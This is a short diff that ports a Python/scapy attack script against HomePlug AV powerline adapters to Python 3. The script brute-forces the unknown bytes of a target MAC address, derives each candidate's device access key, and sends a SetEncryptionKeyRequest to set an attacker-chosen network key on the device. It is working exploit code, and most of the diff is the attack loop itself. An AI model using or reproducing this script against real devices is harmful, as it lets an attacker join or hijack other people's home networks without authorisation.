@@ -7,6 +7,7 @@
 import sys
 import binascii
 import itertools
+from scapy.all import sendp, sniff
 from layerscapy.HomePlugAV import *
 from PBKDF1 import *
 from genDAK import *
@@ -28,7 +29,7 @@ if __name__ == "__main__":
     (options, args) = parser.parse_args()
     arg = options.macaddress
     _bytes = [hex(x)[2:] for x in (range(0x100))]
-    products = itertools.product(_bytes, repeat=(6-len(arg)/2))
+    products = itertools.product(_bytes, repeat=int(6 - len(arg) / 2))
 
     for x in products:
         cmac = '' 
@@ -40,6 +41,6 @@ if __name__ == "__main__":
         newmac = arg + cmac
         keygen = DAKgen(newmac)
         DAKpass = keygen.generate()
-        pbkdf1 = PBKDF1(DAKpass, DAK_SALT, 16, hashlib.sha256())    
+        pbkdf1 = PBKDF1(DAKpass.encode(), DAK_SALT.encode(), 16, hashlib.sha256())    
         pkt = Ether(src=options.sourcemac)/HomePlugAV()/SetEncryptionKeyRequest(NMK=options.nmk, EKS=1, DAK=binascii.unhexlify(pbkdf1))
         sendp(pkt, iface=options.iface)
